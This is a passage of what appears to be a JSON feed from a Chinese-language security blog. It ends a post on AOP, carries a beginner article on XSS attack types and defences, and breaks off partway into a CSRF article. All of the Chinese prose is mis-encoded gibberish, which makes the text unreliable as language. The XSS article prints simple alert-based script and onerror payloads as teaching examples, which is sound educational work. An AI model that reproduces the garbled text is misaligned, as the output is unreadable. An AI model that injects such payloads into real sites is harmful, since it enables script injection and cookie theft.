ç¹¼æ‰¿ target é¡åˆ¥å°±èƒ½å®Œæˆå‹•æ…‹ä»£ç†ï¼Œè€Œä¸éœ€è¦è®“æ‰€æœ‰éœ€è¦ AOP çš„é¡åˆ¥éƒ½å¯¦ä½œç‰¹å®šä»‹é¢ [7] ã€‚</p>\n<h4 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> çµèª</h4>\n<p>AOP åˆ‡åˆ†é—œæ³¨é»çš„æ ¸å¿ƒæ€æƒ³åœ¨ä¸åŒç”Ÿæ…‹ç³»ä¸­éƒ½æœ‰ä¸åŒçš„å¯¦ç¾æ–¹å¼ã€‚</p>\n<p>å¦‚æœæ˜¯åœ¨ Java é€™ç¨®æœ‰çœ¾å¤š AOP ä¸åŒå¯¦ç¾çš„å·¥å…·å­˜åœ¨çš„èªè¨€ï¼Œä¹Ÿè¦æ³¨æ„å°±ç®—ä½¿ç”¨æ–¹å¼çœ‹èµ·ä¾†å¹¾ä¹ä¸€æ¨¡ä¸€æ¨£ï¼ˆçœ‹çœ‹ AspectJ å’Œ Spring AOP çš„èªæ³•é‚£é©šäººçš„ç›¸ä¼¼åº¦ï¼‰ï¼ŒèƒŒå¾ŒåŸ·è¡Œçš„åŸç†å°è‡´çš„é©ç”¨æƒ…å¢ƒã€åŸ·è¡Œæ•ˆç‡ç­‰ç­‰çš„å·®åˆ¥æ‰€å¸¶ä¾†çš„å½±éŸ¿ã€‚</p>\n<p><img src=\"/img/posts/max/TheSpiritAndImplementationOfAOP/1__FzyYBeQHVhaDG7Ln9Fif__A.png\" alt=\"\"></p>\n<p>â€”â€Šâ€”â€Š-</p>\n<p>æœ€å¾Œç¨å¾®ä»‹ç´¹ä¸€ä¸‹æ•åœ˜éšŠã€‚æˆ‘å€‘æ˜¯éš¸å±¬æ–¼ OneDegree é›†åœ˜åº•ä¸‹çš„ Cymetrics éƒ¨é–€ï¼Œæ­¤éƒ¨é–€ä¸»è¦è² è²¬é›†åœ˜ä¸­è³‡å®‰ç”¢å“çš„é–‹ç™¼ï¼Œåœ˜éšŠæ–‡åŒ–é¼“å‹µå·¥ç¨‹å¸«é‘½ç ”å’Œåˆ†äº«æŠ€è¡“åŸç†ã€‚</p>\n<p>ç›®å‰åœ˜éšŠæœ‰ç¶“ç‡Ÿä¸€å€‹æŠ€è¡“ Blog <a href=\"https://medium.com/cymetrics\">https://medium.com/cymetrics</a>Â <br>\nç”¨ä¾†åˆ†äº«åœ˜éšŠæˆå“¡å€‘åœ¨å·¥ä½œä¸­é‡åˆ°æˆ–è€…è‡ªå·±æƒ³é‘½ç ”çš„ä¸»é¡Œã€‚</p>\n<h4 id=\"references%3A\"><a class=\"direct-link\" href=\"#references%3A\">#</a> References:</h4>\n<p>[1]<a href=\"https://www.slideshare.net/koneru9999/aspect-oriented-programing-introduction\">https://www.slideshare.net/koneru9999/aspect-oriented-programing-introduction</a><br>\n[2]<a href=\"https://stackoverflow.com/questions/8328824/what-is-the-difference-between-python-decorators-and-the-decorator-pattern\">https://stackoverflow.com/questions/8328824/what-is-the-difference-between-python-decorators-and-the-decorator-pattern</a><br>\n[3]<a href=\"https://livebook.manning.com/book/aspectj-in-action-second-edition/chapter-8/26\">https://livebook.manning.com/book/aspectj-in-action-second-edition/chapter-8/26</a><br>\n[4]<a href=\"https://www.nurkiewicz.com/2009/10/yesterday-i-had-pleasure-to-participate.html\">https://www.nurkiewicz.com/2009/10/yesterday-i-had-pleasure-to-participate.html</a><br>\n[5]<a href=\"https://www.itread01.com/content/1547764384.html\">https://www.itread01.com/content/1547764384.html</a><br>\n[6]<a href=\"https://mattwarren.org/2016/12/14/Why-is-Reflection-slow/\">https://mattwarren.org/2016/12/14/Why-is-Reflection-slow/</a><br>\n[7]<a href=\"https://www.cnblogs.com/carpenterlee/p/8241042.html\">https://www.cnblogs.com/carpenterlee/p/8241042.html</a></p>\n",
      "date_published": "2021-05-27T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/jo/zerobased-cross-site-scripting/",
      "url": "https://tech-blog.cymetrics.io/posts/jo/zerobased-cross-site-scripting/",
      "title": "é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆäºŒï¼‰-èªè­˜ XSSï¼ˆCross-Site Scriptingï¼‰",
      "content_html": "<!-- summary -->\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<blockquote>\n<p>ä½ ï¼<strong>User</strong> é™Œç”Ÿäººï¼<strong>Hacker</strong> èœå–®ï¼<strong>Request</strong> æ¡Œè™Ÿï¼<strong>cookie</strong> è€é—†ï¼<strong>web server</strong></p>\n<p>æƒ³åƒä½ åˆ°ä¸€å®¶é¤å»³åƒé£¯ï¼Œé™Œç”Ÿäººåœ¨æœ‰ä½ æ¡Œè™Ÿçš„èœå–®å‚™è¨»å¯«ä¸Šç„¡æ•µå¤§è¾£ï¼Œæ¥è‘—ä½ æ²’æœ‰ç™¼ç¾ä¾¿ç›´æ¥æŠŠèœå–®é€çµ¦è€é—†ï¼Œç„¶å¾Œè€é—†å°±é€ä¾†äº†ä¸€ä»½åŠ äº†ç„¡æ•µå¤§è¾£çš„é¤é» ï¼Œé€™å°±æ˜¯ XSS çš„åŸºç¤æ¦‚å¿µã€‚</p>\n</blockquote>\n<!-- summary -->\n<h2 id=\"%E9%87%8B%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E9%87%8B%E4%BE%8B\">#</a> é‡‹ä¾‹</h2>\n<p>ä»¥å‰è¨€çš„ç¯„ä¾‹ä¾†åšèªªæ˜ï¼Œç•¶ç¶²é åœ¨é€²è¡Œ browser render <strong>è¨»1</strong>çš„æ™‚å€™ï¼ˆè€é—†æ”¶åˆ°èœå–®é–‹å§‹åšèœï¼‰ï¼Œä½¿ç”¨è€…<strong>è¼¸å…¥çš„æ¬„ä½</strong>æˆ–æ˜¯<strong>æ²’æœ‰è¢«é©—è­‰çš„åƒæ•¸</strong>å°±è¢«åµŒå…¥åœ¨ç¶²é çš„ç¨‹å¼ç¢¼ï¼ˆèœå–®ï¼‰è£¡é¢ï¼Œå¦‚æœé€™æ®µè¼¸å…¥åŒ…å«æƒ¡æ„ç¨‹å¼ï¼ˆè¢«å‚™è¨»ç„¡æ•µå¤§è¾£ï¼‰å°±æœƒå°è‡´ä½¿ç”¨è€…ç€è¦½é€™å€‹é é¢çš„æ™‚å€™è§¸ç™¼é€™æ®µæƒ¡æ„ç¨‹å¼ï¼Œå°è‡´ XSS é¢¨éšªçš„ç™¼ç”Ÿã€‚</p>\n<h2 id=\"xss%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B\"><a class=\"direct-link\" href=\"#xss%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B\">#</a> XSSæ”»æ“Šæµç¨‹</h2>\n<p><img src=\"/img/posts/jo/zerobased-cross-site-scripting/p1.png\" alt=\"\"></p>\n<ol>\n<li>Hacker åœ¨å—å®³ç¶²ç«™æ³¨å…¥ XSS æ¼æ´</li>\n<li>é€éç¤¾äº¤å·¥ç¨‹æ‰‹æ³•å‚³é€æƒ¡æ„ URL çµ¦ User</li>\n<li>ç•¶ User é»æ“Š URL ä¾¿æœƒæŠŠè‡ªå·±çš„è³‡æ–™ï¼ˆcookieï¼‰è—‰ç”±å—å®³ç¶²ç«™å‚³å›çµ¦ Hacker</li>\n</ol>\n<h2 id=\"xss%E4%B8%89%E5%A4%A7%E7%A8%AE%E9%A1%9E\"><a class=\"direct-link\" href=\"#xss%E4%B8%89%E5%A4%A7%E7%A8%AE%E9%A1%9E\">#</a> XSSä¸‰å¤§ç¨®é¡</h2>\n<h3 id=\"%E5%8F%8D%E5%B0%84%E5%9E%8B-xss-%EF%BC%88reflected%EF%BC%89\"><a class=\"direct-link\" href=\"#%E5%8F%8D%E5%B0%84%E5%9E%8B-xss-%EF%BC%88reflected%EF%BC%89\">#</a> åå°„å‹ XSS ï¼ˆReflectedï¼‰</h3>\n<ul>\n<li>æœ€å¸¸è¦‹çš„ XSS æ”»æ“Šé¡å‹ï¼Œé€šå¸¸æ˜¯å°‡æƒ¡æ„ç¨‹å¼æœƒè—åœ¨ç¶²å€åˆ—è£¡ï¼Œæ”¾åœ¨ GET åƒæ•¸å‚³éï¼Œç¯„ä¾‹å¦‚ä¸‹ï¼š</li>\n</ul>\n<pre class=\"language-txt\"><code class=\"language-txt\">http://www.example.com/upload.asp?id=&lt;script>alert(1);&lt;/script></code></pre>\n<ul>\n<li>é€™ç¨®æ‰‹æ³•è¦èƒ½å¤ æˆåŠŸæ”»æ“Šï¼Œéœ€è¦ä½¿ç”¨ç¤¾äº¤å·¥ç¨‹é‡£é­šçš„æŠ€å·§ï¼Œä½¿ User é»æ“ŠURL æ”»æ“Šæ‰æœƒç”Ÿæ•ˆã€‚</li>\n<li>å› ç‚º URL é€šå¸¸çœ‹èµ·ä¾†å¾ˆè©­ç•°ï¼Œæ‰€ä»¥ Hacker é€šå¸¸æœƒä½¿ç”¨çŸ­ç¶²å€æˆ– HTML Encoder è¨»2çš„æ–¹å¼å˜—è©¦æ¬ºé¨™ Userã€‚</li>\n</ul>\n<h3 id=\"dom-%E5%9E%8B-xss\"><a class=\"direct-link\" href=\"#dom-%E5%9E%8B-xss\">#</a> DOM å‹Â XSS</h3>\n<ul>\n<li>é€™ç¨®æ‰‹æ³•å’Œåå°„å‹ XSSä¸€æ¨£ï¼Œéƒ½éœ€è¦ä½¿ç”¨ç¤¾äº¤å·¥ç¨‹é‡£é­šçš„æŠ€å·§ï¼Œä½¿ User é»æ“Š URL æ”»æ“Šæ‰æœƒç”Ÿæ•ˆã€‚</li>\n<li>Hacker åœ¨ URL è¼¸å…¥ DOM <strong>è¨»3</strong> ç‰©ä»¶ï¼ŒæŠŠç‰©ä»¶åµŒå…¥ç¶²é ç¨‹å¼ç¢¼ï¼Œç¯„ä¾‹ï¼š</li>\n</ul>\n<pre class=\"language-txt\"><code class=\"language-txt\">&lt;img src=# onerror=â€alert(123)â€></code></pre>\n<h3 id=\"%E5%84%B2%E5%AD%98%E5%9E%8B-xss-(-stored-)\"><a class=\"direct-link\" href=\"#%E5%84%B2%E5%AD%98%E5%9E%8B-xss-(-stored-)\">#</a> å„²å­˜å‹ XSS ( StoredÂ )</h3>\n<ul>\n<li>èˆ‡å‰å…©ç¨®æ‰‹æ³•ä¸åŒçš„æ˜¯æ­¤ç¨®æ”»æ“Šæ‰‹æ³•ä¸éœ€è¦ä½¿ç”¨ç¤¾äº¤å·¥ç¨‹é‡£é­šçš„æŠ€å·§ï¼Œä¹Ÿèƒ½ä½¿ User å—åˆ°æ”»æ“Š</li>\n<li>æ”»æ“Šçš„æ–¹å¼æ˜¯ Hacker å°‡ Javascript å„²å­˜åœ¨ä¼ºæœå™¨çš„è³‡æ–™åº«ä¸­ï¼Œé€²è€Œå¼•èµ·ä½¿ User é­å—æ”»æ“Šã€‚</li>\n<li>æœ€å¸¸è¦‹çš„ä¾‹å­å°±æ˜¯å°‡ Javascript æ³¨å…¥ç•™è¨€æ¿ï¼Œç•¶ä¸‹ä¸€ä½ User ç€è¦½ç¶²é æ™‚ï¼Œç¶²é æœƒè¼‰å…¥ç•™è¨€æ¿çš„ Javascript é€²è€Œä½¿ User å—åˆ°æ”»æ“Šï¼Œç¯„ä¾‹å¦‚ä¸‹ï¼š</li>\n</ul>\n<pre class=\"language-txt\"><code class=\"language-txt\">æˆ‘æ˜¯å£äººï¼ &lt;script>alert(1);&lt;/script></code></pre>\n<p>ç„¶å¾Œç•¶ User ç€è¦½ç¶²é çš„æ™‚å€™ï¼Œå°±æœƒå› ç‚ºç¶²é å…ˆè¼‰å…¥äº†ç•¶ä¸‹é é¢çš„æƒ¡æ„ç¨‹å¼ï¼Œæ–¼æ˜¯ User çš„é é¢å°±æœƒè·³å‡ºä¸€å€‹ 1 çš„ alertï¼Œä»¥æ­¤é¡æ¨ï¼Œ Hacker åœ¨é€™è£¡å¦‚æœè¼¸å…¥è®“ User å‚³é€ cookie æˆ–æ˜¯å…¶ä»–æƒ¡æ„ç¨‹å¼è¡Œç‚ºï¼Œç¶²é ä¹Ÿæœƒå®Œå…¨ç…§åšï¼</p>\n<p><strong>åŸ·å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨ä¸‰ç¨®XSSæ”»æ“Šä¸­ï¼ŒDOM å‹ XSS å’Œå¦å¤–å…©ç¨® XSS çš„å€åˆ¥æ˜¯ DOM å‹ XSS æ”»æ“Šä¸­ï¼Œæå–å’ŒåŸ·è¡Œæƒ¡æ„ç¨‹å¼éƒ½æ˜¯ç”± Browser ç«¯å®Œæˆï¼Œå±¬æ–¼å‰ç«¯ JavaScript çš„å®‰å…¨æ¼æ´ï¼Œè€Œå…¶ä»–å…©ç¨® XSS éƒ½æ˜¯å› ç‚ºä¼ºæœå™¨è€Œç”¢ç”Ÿçš„å®‰å…¨é¢¨éšªã€‚</strong></p>\n<h2 id=\"%E9%A7%AD%E5%AE%A2%E5%AF%A6%E9%9A%9B%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E9%A7%AD%E5%AE%A2%E5%AF%A6%E9%9A%9B%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B\">#</a> é§­å®¢å¯¦éš›åˆ©ç”¨XSSæ¼æ´æ¡ˆä¾‹</h2>\n<p><img src=\"/img/posts/jo/zerobased-cross-site-scripting/p2.png\" alt=\"\"><br>\n<strong>photo by <a href=\"https://www.ithome.com.tw/news/139205\">https://www.ithome.com.tw/news/139205</a></strong></p>\n<p>èˆ‡ä¸ŠæœŸä¸€æ¨£çš„å¯¦éš›æ¡ˆä¾‹ï¼Œä»¥é€™å€‹é¢¨éšªä¾†åšä¸€å€‹æ¥çºŒçš„èªªæ˜ï¼Œé€™å€‹é¢¨éšªé™¤äº† CSRF ä»¥å¤–ï¼Œä¹Ÿæœ‰å„²å­˜å‹ XSS çš„é¢¨éšªï¼Œæœƒå…è¨±é§­å®¢å°‡æƒ¡æ„ç¨‹å¼è²¼åˆ°è¨è«–å€ä¸­ï¼Œè€Œç•¶ User ä»¥ç€è¦½å™¨é€ è¨ªé é¢æ™‚ï¼Œç¶²é ä¾¿æœƒåœ¨èƒŒæ™¯åŸ·è¡Œç¨‹å¼ï¼Œå»çœ‹ä¸åˆ°ç¨‹å¼ç¢¼ã€‚</p>\n<p>ä¸ŠæœŸçš„ CSRF å°±æ˜¯é è¨­ä¸»è¾¦å–®ä½ä¸­äº†æ­¤é¡å‹çš„å„²å­˜å‹ XSS çš„é¢¨éšªå¾Œï¼Œè¢« XSS ä¸­çš„æƒ¡æ„ç¨‹å¼ç«Šå–äº†æ¬Šé™ï¼Œé€²è€Œå°è‡´äº† CSRF çš„é¢¨éšªï¼Œä½¿ Hacker èƒ½å¤ ä»¥ä¸»è¾¦å–®ä½çš„æ¬Šé™åŸ·è¡Œæ“ä½œã€‚</p>\n<h2 id=\"%E9%98%B2%E7%AF%84xss%E7%9A%84%E6%BA%96%E5%89%87\"><a class=\"direct-link\" href=\"#%E9%98%B2%E7%AF%84xss%E7%9A%84%E6%BA%96%E5%89%87\">#</a> é˜²ç¯„XSSçš„æº–å‰‡</h2>\n<ol>\n<li>\n<p>åšå¥½æ¬„ä½è¼¸å…¥çš„é©—è­‰èˆ‡æª¢æŸ¥ï¼Œä¸è«–æ˜¯å‰å¾Œç«¯éƒ½æ‡‰å‡è¨­è¼¸å…¥æ˜¯æƒ¡æ„ä¸”ä¸å¯ä¿¡ä»»çš„ï¼Œä¾‹å¦‚ï¼šURLã€æª”æ¡ˆä¸Šå‚³ã€è¡¨å–®æ¬„ä½ã€ç•™è¨€æ¿ç­‰ã€‚</p>\n</li>\n<li>\n<p>æ–‡æ³•èˆ‡èªæ„ï¼šæ‡‰ç¢ºèªæ¯å€‹ç¶²é è¡¨å–®è¼¸å…¥æ¬„ä½æ˜¯å¦ç‚ºåˆç†çš„è³‡æ–™é¡å‹èˆ‡å…§å®¹ï¼Œä¾‹å¦‚ï¼šå¹´é½¡çš„æ¬„ä½åœ¨æ–‡æ³•ä¸Šæ‡‰åªæ¥å—0â€“9çš„æ•¸å­—ï¼Œè€Œèªæ„ä¸Šæ‡‰ç¢ºèªæ­¤æ•¸å­—ä»‹æ–¼ 0â€“120ã€‚</p>\n</li>\n<li>\n<p>åƒä¸Šè¿°æ‰€èªªæ˜çš„ä»»ä½•è¼¸å…¥å’Œå…¶ä»–é›£ä»¥å®šç¾©æ–‡æ³•çš„è‡ªç”±æ ¼å¼ï¼Œéƒ½æ‡‰è©²è¦ç¶“éç·¨ç¢¼æˆç‚ºç´”å­—ç¬¦ä¸²ä¾†è™•ç†ï¼Œé˜²æ­¢å…§å®¹è¢«ç•¶ä½œç¨‹å¼ç¢¼åŸ·è¡Œï¼Œè¨±å¤šç¨‹å¼æ¡†æ¶éƒ½æœ‰æä¾›å…§å»ºçš„ç·¨ç¢¼å‡½å¼åº«ï¼Œå¯ä»¥ä¾è‡ªå·±çš„æ…£ç”¨èªè¨€ç¨‹å¼æŸ¥æ‰¾ä¸¦å¤šåŠ åˆ©ç”¨ã€‚</p>\n</li>\n<li>\n<p>çµ•å°ä¸è¦å°‡ä½¿ç”¨è€…çš„è¼¸å…¥æ”¾å…¥ è¨»è§£ã€å±¬æ€§åç¨±ã€æ¨™ç±¤åç¨± ç­‰ï¼Œå› ç‚ºé€™äº›ä½ç½®éƒ½èƒ½å°‡å­—ç¬¦ä¸²ä½œç‚ºç¨‹å¼ç¢¼é‹è¡Œ<br>\nå¦å¤–ï¼Œæ–¼ä¼ºæœå™¨ä¸Šå¯ä½œä»¥ä¸‹è¨­å®šå¢å¼·<strong>ç€è¦½å™¨</strong>çš„é˜²è­·ï¼š<br>\nâ€¢å° cookie è¨­å®š HttpOnly çš„å±¬æ€§ï¼Œç¢ºä¿ç¨‹å¼ç¢¼æ²’æœ‰å­˜å–æ¬Š<br>\nâ€¢è¨­å®šå…§å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰çš„æ¨™é ­ï¼Œæ˜ç¢ºå®šç¾©å…è¨±ç€è¦½å™¨åœ¨è©²é é¢ä¸ŠåŠ è¼‰çš„å…§å®¹ä¾†æºï¼Œæ¶µè“‹çš„é¡å‹åŒ…æ‹¬ JavaScriptCSSã€HTMLæ¡†æ¶ã€å­—é«”ã€åœ–ç‰‡å’Œå¯åµŒå…¥å°è±¡ï¼Œä¾‹å¦‚ Java appletã€ActiveXç­‰ã€‚</p>\n</li>\n</ol>\n<h2 id=\"%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B\"><a class=\"direct-link\" href=\"#%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B\">#</a> åè©è§£é‡‹</h2>\n<p><strong>è¨»1</strong>ï¼šBrowser Renderï¼šç€è¦½å™¨æ¸²æŸ“ï¼ˆ browser render ï¼‰æ˜¯å°‡ URL å°æ‡‰çš„å„ç¨®è³‡æºï¼Œé€šéç€è¦½å™¨çš„æ¸²æŸ“å¼•æ“é€²è¡Œè§£æï¼Œè¼¸å‡ºè¦–è¦ºåŒ–çš„å½±è±¡ï¼Œæ¸²æŸ“å¼•æ“åŒ…æ‹¬åƒæ˜¯ HTML ç›´è­¯å™¨ã€ä½ˆå±€ï¼ˆ layout ï¼‰ã€CSS ç›´è­¯å™¨å’Œ JavaScript å¼•æ“ã€‚</p>\n<p><strong>è¨»2</strong>ï¼šHTML Encoderï¼šé€™æ˜¯ç‚ºäº†é¿å…ç‰¹æ®Šç¬¦è™Ÿé€ æˆçš„é¡¯ç¤ºå•é¡Œï¼Œä»¥åŠé¿å…HTML å°‡ URL ä¸­çš„ç‰¹æ®Šç¬¦è™Ÿè¦–ç‚ºèªæ³•è€Œç”¢ç”Ÿçš„ç·¨ç¢¼ï¼Œç¯„ä¾‹å¦‚ä¸‹ï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">&lt;script>alert(1);&lt;/script> </code></pre>\n<p>æœƒè¢«è½‰æ›æˆ</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E</code></pre>\n<p>ä½†åœ¨é€™è£¡ Hacker æœƒåå…¶é“è€Œè¡Œæ•…æ„å°‡è¦è¼¸å…¥åœ¨ URL çš„ç‰¹æ®Šç¬¦è™Ÿå…ˆè½‰æ›æˆ HTML Encoder è¼¸å…¥ï¼Œè®“ WebSever è§£ææˆç‰¹æ®Šç¬¦è™Ÿï¼Œé€²è€Œé€²è¡Œ XSS æ”»æ“Šã€‚</p>\n<p><strong>è¨»3</strong>ï¼šDOMï¼šDOM å…¨åç‚º Document Object Modelï¼Œæ˜¯ç”¨ä¾†æè¿° HTML æ–‡ä»¶çš„è¡¨ç¤ºæ³•ï¼Œå¯ä»¥ä½¿ç”¨ JavaScript ä¾†å‹•æ…‹ç”¢ç”Ÿå®Œæ•´çš„ç¶²é ï¼Œè€Œä¸å¿…é€éä¼ºæœå™¨ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯æŠŠä¸€ä»½ HTML æ–‡ä»¶ä¸­çš„å„ç¨®æ¨™ç±¤åŠæ–‡å­—ã€åœ–ç‰‡ç­‰ï¼Œéƒ½å®šç¾©æˆä¸€å€‹å€‹ç¶²é ç‰©ä»¶ï¼Œè€Œé€™äº›ç‰©ä»¶æœ€çµ‚æœƒæˆç‚ºä¸€å€‹æ¨¹ç‹€çµæ§‹ï¼Œç¯„ä¾‹å¦‚ä¸‹ï¼š</p>\n<p><img src=\"/img/posts/jo/zerobased-cross-site-scripting/p3.png\" alt=\"\"></p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> ç¸½çµ</h2>\n<p>è¬›å®Œäº† CSRF å’Œ XSS é€™å°å…„å¼Ÿï¼Œæ¥è‘—ä¸‹ä¸€ç¯‡æœƒèªªæ˜ç¶²é å®‰å…¨ä¸‰æœ¬æŸ± Secure ã€ samsite ã€ Httponly ä»–å€‘ä¹‹é–“ä¸å¾—ä¸èªªçš„æ•…äº‹ï¼Œå†ä¹‹å¾Œæœƒæåˆ°é—œæ–¼å…§å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰å’Œè·¨åŸŸè³‡æºå…±ç”¨ï¼ˆCORSï¼‰èˆ‡ç¶²é å®‰å…¨çš„é—œä¿‚ã€‚</p>\n<h2 id=\"%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\"><a class=\"direct-link\" href=\"#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\">#</a> å»¶ä¼¸é–±è®€</h2>\n<h3 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89--%E8%AA%8D%E8%AD%98-csrf%EF%BC%88cross-site-request-forgery%EF%BC%89\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89--%E8%AA%8D%E8%AD%98-csrf%EF%BC%88cross-site-request-forgery%EF%BC%89\">#</a> é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆä¸€ï¼‰- èªè­˜ CSRFï¼ˆCross Site Request Forgeryï¼‰</h3>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-request-forgery\">èªè­˜ CSRF(Cross Site Request ForgeryÂ )</a></p>\n</blockquote>\n",
      "date_published": "2021-05-27T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/jo/zerobased-cross-site-request-forgery/",
      "url": "https://tech-blog.cymetrics.io/posts/jo/zerobased-cross-site-request-forgery/",
      "title": "é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆä¸€ï¼‰-èªè­˜ CSRFï¼ˆCross Site Request Forgeryï¼‰",
      "content_html": "<!-- summary -->\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<blockquote>\n<p>é™Œç”Ÿäººï¼ <strong>Hacker</strong> èœå–® ï¼ <strong>Request</strong><br>\næ¡Œè™Ÿï¼ <strong>cookie è¨»1</strong> è€é—†ï¼ <strong>web server</strong> ä½  ï¼ <strong>User</strong></p>\n<p>æƒ³åƒä½ åˆ°ä¸€å®¶é¤å»³åƒé£¯ï¼Œé™Œç”Ÿäººæ‹¿äº†ä¸€å¼µæœ‰ä½ æ¡Œè™Ÿçš„èœå–®é»é¤ä¹‹å¾Œçµ¦è€é—†ï¼Œçµæœè€é—†å•ä¹Ÿä¸å•ä¾¿æ”¶äº†èœå–®ä¸¦å°‡å¸³è¨˜åˆ°äº†ä½ çš„èº«ä¸Šï¼Œé€™å°±æ˜¯ CSRF çš„åŸºç¤æ¦‚å¿µã€‚</p>\n</blockquote>\n<!-- summary -->\n<h2 id=\"%E9%87%8B%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E9%87%8B%E4%BE%8B\">#</a> é‡‹ä¾‹</h2>\n<p>CSRF ( Cross Site Request Forgery )ï¼Œç¿»æˆä¸­æ–‡å«åš<strong>è·¨ç«™è«‹æ±‚å½é€ </strong>ï¼Œå…¶å¯¦å­—é¢ä¸ŠæŠŠä»–çŒœæˆæ‹†é–‹æˆè«‹æ±‚å½é€ å’Œè·¨ç«™ä¹‹å¾Œå°±è »å¥½ç†è§£çš„ï¼Œæ€éº¼èªªå‘¢ï¼Ÿ æˆ‘ä»¥å‰è¨€çš„ä¾‹å­ä¾†èªªæ˜ä¸€ä¸‹<strong>è·¨ç«™è«‹æ±‚å½é€ æ˜¯æ€éº¼ä¸€å›äº‹</strong></p>\n<p>å…ˆè¬›è«‹æ±‚å½é€ ï¼Œè«‹æ±‚å½é€ çš„æ„æ€å¾ˆå¥½ç†è§£ï¼ŒæŒ‡çš„æ˜¯é™Œç”Ÿäººæ‹¿äº†ä¸€å¼µæœ‰ä½ æ¡Œè™Ÿçš„èœå–®é»è‡ªå·±æƒ³é»çš„é¤ä¹‹å¾Œçµ¦è€é—†é€™ä»¶äº‹ï¼ˆ Hacker ç”¨å¸¶è‘—ä½  cookie çš„ Request é€çµ¦ web server ï¼‰ï¼Œé‚£è‡³æ–¼è·¨ç«™è·¨åœ¨å“ªè£¡å‘¢ï¼Ÿ</p>\n<p>è·¨åœ¨é™Œç”Ÿäººåœ¨ä½ ä¸çŸ¥æƒ…çš„æƒ…æ³ä¸‹æŠŠæœ‰ä½ æ¡Œè™Ÿçš„èœå–®é€çµ¦äº†è€é—†ï¼Œæ‰€ä»¥è·¨éäº†æœ¬è©²çŸ¥æƒ…çš„ä½ ï¼ˆé€å‡ºçš„äººä¸åŒï¼Œæ‰€ä»¥é€å‡º Request çš„ Domain è¨»2) ä¹Ÿæœƒä¸åŒï¼‰ï¼ŒCSRF çš„æœ¬è³ªåœ¨æ–¼ web server ç„¡æ¢ä»¶ä¿¡ä»» cookie è€Œæ²’æœ‰å†ç¢ºèªæˆ–ä»¥å…¶ä»–æ–¹å¼é©—è­‰ï¼ˆ ç­‰æ–¼è€é—†å•ä¹Ÿä¸å•ç„¡æ¢ä»¶ç›¸ä¿¡èœå–®ä¸Šçš„æ¡Œè™Ÿï¼Œä¹Ÿä¸çœ‹æ˜¯èª°é€çš„ï¼‰ï¼Œå› æ­¤åªèƒ½ä¿è­‰é€™å€‹Request ç™¼è‡ªæŸå€‹ User ï¼Œå»ä¸èƒ½ä¿è­‰è«‹æ±‚æœ¬èº«æ˜¯ User è‡ªé¡˜ç™¼å‡ºçš„ï¼ˆ ç­‰æ–¼èœå–®ä¸Šçš„æ¡Œè™Ÿæ˜¯ä½ çš„ï¼Œä½†ä¸ä»£è¡¨é€™å€‹èœæ˜¯ä½ é»çš„ ï¼‰ã€‚</p>\n<h2 id=\"csrf-%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B\"><a class=\"direct-link\" href=\"#csrf-%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B\">#</a> CSRF æ”»æ“Šæµç¨‹</h2>\n<p>ç”¨ç°¡å–®çš„åœ–å¸¶ä½ çœ‹ä¸€ä¸‹ Hacker çš„çŠ¯æ¡ˆéç¨‹</p>\n<p><img src=\"/img/posts/jo/zerobased-cross-site-request-forgery/p1.png\" alt=\"\"></p>\n<ol>\n<li>User è¨ªå•ä¸¦ç™»å…¥ A ç¶²ç«™</li>\n<li>User ç²å¾— Cookie ä¸¦å­˜è‡³ User ç€è¦½å™¨</li>\n<li>User åœ¨æœªç™»å‡º A ç¶²ç«™çš„æƒ…æ³ä¸‹ç€è¦½ B ç¶²ç«™ï¼Œæ¥è‘— Hacker ä»¥ B ç¶²ç«™çš„ Domain ä»¥ A ç¶²ç«™çµ¦ User çš„ Cookie å° A ç¶²ç«™ç™¼é€è«‹æ±‚ï¼Œå¦‚æœ A ç¶²ç«™æ²’ç™¼ç¾çš„è©±å°± GG äº†ã€‚</li>\n</ol>\n<p>ï¼Šï¼¢ç¶²ç«™æœƒåœ¨è‡ªèº«çš„ç¶²ç«™ä¸­åŠ å…¥å« A ç¶²ç«™ Domain çš„ Javascript ï¼Œä¾‹å¦‚ï¼šä¸Šæ–¹åœ–ä¸­çš„ 